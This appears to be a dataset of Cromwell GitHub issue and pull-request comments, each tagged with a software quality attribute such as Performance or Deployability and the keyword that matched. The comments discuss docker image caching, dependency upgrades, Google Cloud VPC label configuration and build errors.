https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:217,Modifiability,config,config,217,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:272,Modifiability,config,config,272,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:857,Modifiability,config,configure,857,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:279,Performance,cache,cache,279,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:336,Performance,cache,cached,336,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:411,Performance,cache,cache,411,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:554,Performance,perform,perform,554,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:965,Performance,cache,cached,965,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:162,Usability,simpl,simply,162,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/pull/6456#issuecomment-895312885:87,Deployability,update,update,87,"Just OOO, is this mostly complementary, orthogonal, or replacing-of, the scala steward update PRs?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6456#issuecomment-895312885
https://github.com/broadinstitute/cromwell/pull/6456#issuecomment-898914755:816,Availability,avail,available,816,"> Just OOO, is this mostly complementary, orthogonal, or replacing-of, the scala steward update PRs?. I haven't gone through the various other PRs yet to see what they're fixing or not. Over weekends I've been experimenting with updating various subsystems I'm already familiar with and seeing if Travis likes the changes. If I had to guess, there's probably a bit of overlap with the version bumps here and the scala steward PRs. Things done here, and may or may not have been addressed in the stewarded PRs:; - Some non-semver versions have been updated/fixed. Does scala steward do date comparisons or only semver? (ex: nl.grons.metrics(3), apache commons, workbench-libs, etc.); - Some intermediate version fixes have been applied. The versions listed in `develop` will be out of date, while the absolute latest available version may not be compatible (ex: cats-effect, fs2, http4s, etc.); - Some SDKs had a few deprecated functions and required a little RTFMing 📖 (ex: sentry). Btw, as it's not a blocker (yet) some weekend I or someone else will have to dive into statsd and deal with those libs plus whatever our bespoke statsd-proxy is doing... 🤔",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6456#issuecomment-898914755
https://github.com/broadinstitute/cromwell/pull/6456#issuecomment-898914755:89,Deployability,update,update,89,"> Just OOO, is this mostly complementary, orthogonal, or replacing-of, the scala steward update PRs?. I haven't gone through the various other PRs yet to see what they're fixing or not. Over weekends I've been experimenting with updating various subsystems I'm already familiar with and seeing if Travis likes the changes. If I had to guess, there's probably a bit of overlap with the version bumps here and the scala steward PRs. Things done here, and may or may not have been addressed in the stewarded PRs:; - Some non-semver versions have been updated/fixed. Does scala steward do date comparisons or only semver? (ex: nl.grons.metrics(3), apache commons, workbench-libs, etc.); - Some intermediate version fixes have been applied. The versions listed in `develop` will be out of date, while the absolute latest available version may not be compatible (ex: cats-effect, fs2, http4s, etc.); - Some SDKs had a few deprecated functions and required a little RTFMing 📖 (ex: sentry). Btw, as it's not a blocker (yet) some weekend I or someone else will have to dive into statsd and deal with those libs plus whatever our bespoke statsd-proxy is doing... 🤔",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6456#issuecomment-898914755
https://github.com/broadinstitute/cromwell/pull/6456#issuecomment-898914755:548,Deployability,update,updated,548,"> Just OOO, is this mostly complementary, orthogonal, or replacing-of, the scala steward update PRs?. I haven't gone through the various other PRs yet to see what they're fixing or not. Over weekends I've been experimenting with updating various subsystems I'm already familiar with and seeing if Travis likes the changes. If I had to guess, there's probably a bit of overlap with the version bumps here and the scala steward PRs. Things done here, and may or may not have been addressed in the stewarded PRs:; - Some non-semver versions have been updated/fixed. Does scala steward do date comparisons or only semver? (ex: nl.grons.metrics(3), apache commons, workbench-libs, etc.); - Some intermediate version fixes have been applied. The versions listed in `develop` will be out of date, while the absolute latest available version may not be compatible (ex: cats-effect, fs2, http4s, etc.); - Some SDKs had a few deprecated functions and required a little RTFMing 📖 (ex: sentry). Btw, as it's not a blocker (yet) some weekend I or someone else will have to dive into statsd and deal with those libs plus whatever our bespoke statsd-proxy is doing... 🤔",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6456#issuecomment-898914755
https://github.com/broadinstitute/cromwell/issues/6458#issuecomment-891252500:122,Testability,log,login,122,The best documentation we have is the discussion on this ticket: https://broadworkbench.atlassian.net/browse/CROM-6716. ( login requires a free account ). Feel free to reopen if it does not solve your problem.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6458#issuecomment-891252500
https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-892901814:172,Energy Efficiency,allocate,allocates,172,"Hello and welcome to the Cromwell repo. Three minutes is about what I would expect from personal experience, as a minimum time to run any task. Consider that Life Sciences allocates, starts, and pulls Docker on a dedicated VM just to print ""hello world"". It will never look favorable for small tasks whose execution time is short compared to VM setup time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-892901814
https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-893427880:96,Performance,cache,cache-manifest-file,96,"Okay, thank you so much for the answer. In this case, then, I would ask if using. `docker-image-cache-manifest-file = ""gs://xxxxx-xxxxx/xxxxx.json""`. is it possible to achieve acceleration in Google Life Sciences or is it possible to use this cache method only for acceleration when running on the local backend?. I am thinking of such a solution, do you think it is in line with cromwell's good practices? -> distribute calculations according to whether I estimate they will be heavy and if so send them to google life sciences for calculation and if not calculate them on the local backend?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-893427880
https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-893427880:243,Performance,cache,cache,243,"Okay, thank you so much for the answer. In this case, then, I would ask if using. `docker-image-cache-manifest-file = ""gs://xxxxx-xxxxx/xxxxx.json""`. is it possible to achieve acceleration in Google Life Sciences or is it possible to use this cache method only for acceleration when running on the local backend?. I am thinking of such a solution, do you think it is in line with cromwell's good practices? -> distribute calculations according to whether I estimate they will be heavy and if so send them to google life sciences for calculation and if not calculate them on the local backend?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-893427880
https://github.com/broadinstitute/cromwell/pull/6464#issuecomment-897208996:39,Testability,test,test,39,"Looks great! And I gave one of the 30s test suites a nudge to re-run, which seems to have now properly called the ""check passed"" hook in github this time around.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6464#issuecomment-897208996
https://github.com/broadinstitute/cromwell/pull/6466#issuecomment-902916922:32,Deployability,update,updated,32,"@cjllanwarne @aednichols I have updated this to reflect Adam's changes, plus naming convention changes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6466#issuecomment-902916922
https://github.com/broadinstitute/cromwell/pull/6466#issuecomment-927871838:51,Deployability,update,updated,51,I'm going to close this MR until it is ready to be updated.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6466#issuecomment-927871838
https://github.com/broadinstitute/cromwell/pull/6467#issuecomment-897794038:82,Availability,failure,failures,82,"restarted your build which failed due to CROM-6791, the leading cause of my build failures...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6467#issuecomment-897794038
https://github.com/broadinstitute/cromwell/issues/6469#issuecomment-921690965:20,Availability,error,error,20,"I'm having the same error, but only when I change the location to anything other than us-central1; Even with a bucket located in europe-west4 and zones set to europe-west4, it only works with location set to us-central1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469#issuecomment-921690965
https://github.com/broadinstitute/cromwell/pull/6475#issuecomment-914365601:0,Availability,Ping,Pinging,0,Pinging @kshakir for direction... can you think of any reason for us not to merge this?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6475#issuecomment-914365601
https://github.com/broadinstitute/cromwell/pull/6476#issuecomment-906856722:112,Modifiability,config,config,112,BT heard from Sri over old school email that:. > Looks like we can provide full network and subnet paths in the config. This would definitely work for us. Merging,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6476#issuecomment-906856722
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905041782:100,Availability,error,error,100,"I have created a new lablels file and using that to pass the VPC/subnet info but still get the same error:; ```; $ grep -i label genomics.conf; network-label-key = ""my-private-network""; subnetwork-label-key = ""my-private-subnetwork""; $ cat labels.json; {; ""my-private-network"": ""xxxx"",; ""my-private-subnetwork"": ""xxxx""; }; ```; and updated my cromwell command to the following:; ```; java -Dconfig.file=genomics.conf -jar cromwell-66.jar run cumulus.wdl -i cumulus_inputs.json -l labels.json; ```; I still get the same error though. Is this even possible or am I missing something?. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905041782
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905041782:519,Availability,error,error,519,"I have created a new lablels file and using that to pass the VPC/subnet info but still get the same error:; ```; $ grep -i label genomics.conf; network-label-key = ""my-private-network""; subnetwork-label-key = ""my-private-subnetwork""; $ cat labels.json; {; ""my-private-network"": ""xxxx"",; ""my-private-subnetwork"": ""xxxx""; }; ```; and updated my cromwell command to the following:; ```; java -Dconfig.file=genomics.conf -jar cromwell-66.jar run cumulus.wdl -i cumulus_inputs.json -l labels.json; ```; I still get the same error though. Is this even possible or am I missing something?. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905041782
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905041782:332,Deployability,update,updated,332,"I have created a new lablels file and using that to pass the VPC/subnet info but still get the same error:; ```; $ grep -i label genomics.conf; network-label-key = ""my-private-network""; subnetwork-label-key = ""my-private-subnetwork""; $ cat labels.json; {; ""my-private-network"": ""xxxx"",; ""my-private-subnetwork"": ""xxxx""; }; ```; and updated my cromwell command to the following:; ```; java -Dconfig.file=genomics.conf -jar cromwell-66.jar run cumulus.wdl -i cumulus_inputs.json -l labels.json; ```; I still get the same error though. Is this even possible or am I missing something?. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905041782
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905062843:60,Deployability,configurat,configuration,60,"In Cromwell versions 67 and earlier `virtual-private-cloud` configuration exclusively specifies Google project label keys, not literal values. The actual values are specified in labels on the Google project. For example with a VPC config like:. ```hocon; virtual-private-cloud {; network-label-key = ""my-network-label-key""; subnetwork-label-key = ""my-subnetwork-label-key""; auth = ""application-default""; }; ```. As seen in the [labels page in GCP console](https://console.cloud.google.com/iam-admin/labels), there should be project labels with key/values of `my-network-label-key`/`my-private-network` and `my-subnetwork-label-key`/`my-private-subnetwork`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905062843
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905062843:60,Modifiability,config,configuration,60,"In Cromwell versions 67 and earlier `virtual-private-cloud` configuration exclusively specifies Google project label keys, not literal values. The actual values are specified in labels on the Google project. For example with a VPC config like:. ```hocon; virtual-private-cloud {; network-label-key = ""my-network-label-key""; subnetwork-label-key = ""my-subnetwork-label-key""; auth = ""application-default""; }; ```. As seen in the [labels page in GCP console](https://console.cloud.google.com/iam-admin/labels), there should be project labels with key/values of `my-network-label-key`/`my-private-network` and `my-subnetwork-label-key`/`my-private-subnetwork`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905062843
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905062843:231,Modifiability,config,config,231,"In Cromwell versions 67 and earlier `virtual-private-cloud` configuration exclusively specifies Google project label keys, not literal values. The actual values are specified in labels on the Google project. For example with a VPC config like:. ```hocon; virtual-private-cloud {; network-label-key = ""my-network-label-key""; subnetwork-label-key = ""my-subnetwork-label-key""; auth = ""application-default""; }; ```. As seen in the [labels page in GCP console](https://console.cloud.google.com/iam-admin/labels), there should be project labels with key/values of `my-network-label-key`/`my-private-network` and `my-subnetwork-label-key`/`my-private-subnetwork`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905062843
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905064870:401,Availability,error,error,401,"Thanks @mcovarr for your response. I realized that after my initial post and created a labels.json with the following contents:. ```; {; ""google_labels"": {; ""my-private-network"": ""xxx"",; ""my-private-subnetwork"": ""yyy""; }; }; ```. where xxx and yyy are my actual vpc network and subnet names in GCP. Then I added the ""-l labels.json"" option to the cromwell run command but that still gives me the same error. Am I missing something here? Apologies but this is what I am understanding from the posts/docs that needs to happen but won't work when I try it. Am I supposed to create some label in the actual GCP account as well?. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905064870
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905066699:222,Security,access,access,222,"Ahh I think I see what you mean. I don't need the ""-l labels.json"" but need to create an actual Label in the GCP account that has the following key/value:. my-private-network: xxx; my-private-subnetwork: yyy. I don't have access to create the labels but will have someone do this and try again. Let me know if I am still missing something. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905066699
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905094601:80,Availability,error,error,80,"@mcovarr, looks like I got past the initial issue but now getting the following error:; ```; [2021-08-25 01:11:31,83] [info] WorkflowManagerActor: Workflow 2a7b8039-a555-4f58-86b0-dc4a6fa21dff failed (during ExecutingWorkflowState): java.lang.Exception: Task cumulus.cluster:NA:1 failed. The job was stopped before the command finished. PAPI error code 9. generic::failed_precondition: Constraint constraints/compute.trustedImageProjects violated for project gred-cumulus-sb-01-991a49c4. Use of images from project cloud-lifesciences is prohibited.; ```; Looks like our GCP accounts don't allow non standard images. Which image is this workflow trying to use? Is there a way to provide our own image to this pipeline instead? . Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905094601
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905094601:342,Availability,error,error,342,"@mcovarr, looks like I got past the initial issue but now getting the following error:; ```; [2021-08-25 01:11:31,83] [info] WorkflowManagerActor: Workflow 2a7b8039-a555-4f58-86b0-dc4a6fa21dff failed (during ExecutingWorkflowState): java.lang.Exception: Task cumulus.cluster:NA:1 failed. The job was stopped before the command finished. PAPI error code 9. generic::failed_precondition: Constraint constraints/compute.trustedImageProjects violated for project gred-cumulus-sb-01-991a49c4. Use of images from project cloud-lifesciences is prohibited.; ```; Looks like our GCP accounts don't allow non standard images. Which image is this workflow trying to use? Is there a way to provide our own image to this pipeline instead? . Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905094601
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905094601:708,Deployability,pipeline,pipeline,708,"@mcovarr, looks like I got past the initial issue but now getting the following error:; ```; [2021-08-25 01:11:31,83] [info] WorkflowManagerActor: Workflow 2a7b8039-a555-4f58-86b0-dc4a6fa21dff failed (during ExecutingWorkflowState): java.lang.Exception: Task cumulus.cluster:NA:1 failed. The job was stopped before the command finished. PAPI error code 9. generic::failed_precondition: Constraint constraints/compute.trustedImageProjects violated for project gred-cumulus-sb-01-991a49c4. Use of images from project cloud-lifesciences is prohibited.; ```; Looks like our GCP accounts don't allow non standard images. Which image is this workflow trying to use? Is there a way to provide our own image to this pipeline instead? . Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905094601
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905450292:28,Availability,error,error,28,"I am not familiar with that error message. From a bit of Googling it looks like [this](https://medium.com/@byronwhitlock/gcp-trusted-image-policy-1dbce98410c9) may be relevant. Assuming `cloud-lifesciences` is Google's project hosting the image that Cloud Life Sciences is trying to use to spin up the worker VM, you may need to add `projects/cloud-lifesciences` to your organization's [trusted image projects](https://medium.com/@byronwhitlock/gcp-trusted-image-policy-1dbce98410c9#:~:text=the%20trusted%20image-,projects,-.).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905450292
https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905450292:34,Integrability,message,message,34,"I am not familiar with that error message. From a bit of Googling it looks like [this](https://medium.com/@byronwhitlock/gcp-trusted-image-policy-1dbce98410c9) may be relevant. Assuming `cloud-lifesciences` is Google's project hosting the image that Cloud Life Sciences is trying to use to spin up the worker VM, you may need to add `projects/cloud-lifesciences` to your organization's [trusted image projects](https://medium.com/@byronwhitlock/gcp-trusted-image-policy-1dbce98410c9#:~:text=the%20trusted%20image-,projects,-.).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905450292
https://github.com/broadinstitute/cromwell/pull/6482#issuecomment-912506219:98,Deployability,hotfix,hotfix,98,"@breilly2 oops you're right, sorry 😬 I'll recycle your other non-Cromwell PRs for the rest of the hotfix.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6482#issuecomment-912506219
https://github.com/broadinstitute/cromwell/issues/6484#issuecomment-1289256952:96,Modifiability,config,configured,96,"So sorry for the late response. To the best of my understanding, mysql database is needed to be configured to support the cache function. ; [cromwell_mysql.pdf](https://github.com/broadinstitute/cromwell/files/9853162/cromwell_mysql.pdf)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6484#issuecomment-1289256952
https://github.com/broadinstitute/cromwell/issues/6484#issuecomment-1289256952:122,Performance,cache,cache,122,"So sorry for the late response. To the best of my understanding, mysql database is needed to be configured to support the cache function. ; [cromwell_mysql.pdf](https://github.com/broadinstitute/cromwell/files/9853162/cromwell_mysql.pdf)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6484#issuecomment-1289256952
https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934:84,Security,access,access,84,"going to restructure for unit tests, also I'd like to see this work with controlled access data at least once during manual testing...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934
https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934:30,Testability,test,tests,30,"going to restructure for unit tests, also I'd like to see this work with controlled access data at least once during manual testing...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934
https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934:124,Testability,test,testing,124,"going to restructure for unit tests, also I'd like to see this work with controlled access data at least once during manual testing...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934
https://github.com/broadinstitute/cromwell/pull/6486#issuecomment-914482739:14,Deployability,update,update,14,if you had to update the Cromwell server repo template for the `CROMWELL_BUILD_CENTAUR_256_BITS_KEY` variable could you please include those changes?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6486#issuecomment-914482739
https://github.com/broadinstitute/cromwell/pull/6486#issuecomment-914482739:101,Modifiability,variab,variable,101,if you had to update the Cromwell server repo template for the `CROMWELL_BUILD_CENTAUR_256_BITS_KEY` variable could you please include those changes?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6486#issuecomment-914482739
https://github.com/broadinstitute/cromwell/pull/6487#issuecomment-919073756:8,Availability,error,error,8,"If this error happened in production, the Cromwell process would terminate quickly and... presumably restarted by k8s or something. With these changes, the Cromwell process will sleep instead of terminating. Will this negatively impact startup time? I guess it would depend on how long a cold start takes to start initializing backends; I don't know how long that takes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6487#issuecomment-919073756
